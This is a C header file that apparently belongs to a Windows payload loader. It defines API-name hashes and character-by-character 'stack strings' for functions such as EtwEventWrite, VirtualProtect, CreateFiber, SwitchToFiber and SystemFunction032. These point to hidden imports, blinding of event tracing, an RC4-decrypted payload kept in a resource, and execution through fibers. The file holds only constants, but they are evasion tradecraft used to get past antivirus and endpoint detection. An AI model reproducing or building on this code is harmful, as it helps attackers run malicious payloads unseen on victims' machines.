#pragma once

// Module hashes need to be in UNICODE format so adjust the hashes tool
// Hashes of modules
#define KERNEL32_HASH   0xffffffff330c7795
#define NTDLL_HASH      0xffffffff7808a3d2

#define ETWEVENTWRITE_HASH              0xffffffff0d109b8c
#define ETWEVENTWRITEFULL_HASH          0xffffffff22f74be0

#define	RTLCREATEHEAP_HASH		0xfffffffff80c219b
#define RTLALLOCATEHEAP_HASH	0xffffffffa1d45974
#define	RTLDESTROYHEAP_HASH		0xffffffffba6828bf
#define RTLFREEHEAP_HASH		0xffffffffaf11bc24

#define FINDRESOURCEW_HASH      0xffffffffcad4de2b
#define LOADRESOURCE_HASH       0xffffffff92ffa82f
#define LOCKRESOURCE_HASH       0xffffffff49b3b7c3
#define SIZEOFRESOURCE_HASH     0xffffffffc319fa22
#define FREERESOURCE_HASH       0xffffffff033a7dbb

#define HEAPCREATE_HASH			0xffffffffb182dfa9
#define	HEAPALLOC_HASH			0xffffffff5edb1d72
#define VIRTUALPROTECT_HASH		0xffffffff10066f2f
#define CREATEFIBER_HASH		0xffffffffe0751064
#define SWITCHTOFIBER_HASH		0xffffffff0b4a0b81
#define CONVERTTHREADTOFIBER_HASH	0xffffffffa5d373b5

wchar_t k32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
wchar_t strntdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
wchar_t stradvapi32dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };

char strCreateFiber[] = { 'C','r','e','a','t','e','F','i','b','e','r', 0x0 };
char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
char strSwitchToFiber[] = { 'S','w','i','t','c','h','T','o','F','i','b','e','r', 0x0 };
char strConvertThreadToFiber[] = { 'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0x0 };
char strHeapAlloc[] = { 'H','e','a','p','A','l','l','o','c', 0x0 };
char strHeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e', 0x0 };
char strSleep[] = { 'S','l','e','e','p', 0x0 };
char strSystemFunction032[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2', 0x0 };
char strEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
char strFindResourceW[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','W', 0x0 };
char strLoadResource[] = { 'L','o','a','d','R','e','s','o','u','r','c','e', 0x0 };
char strLockResource[] = { 'L','o','c','k','R','e','s','o','u','r','c','e', 0x0 };
char strSizeofResource[] = { 'S','i','z','e','o','f','R','e','s','o','u','r','c','e', 0x0 };
char strFreeResource[] = { 'F','r','e','e','R','e','s','o','u','r','c','e', 0x0 };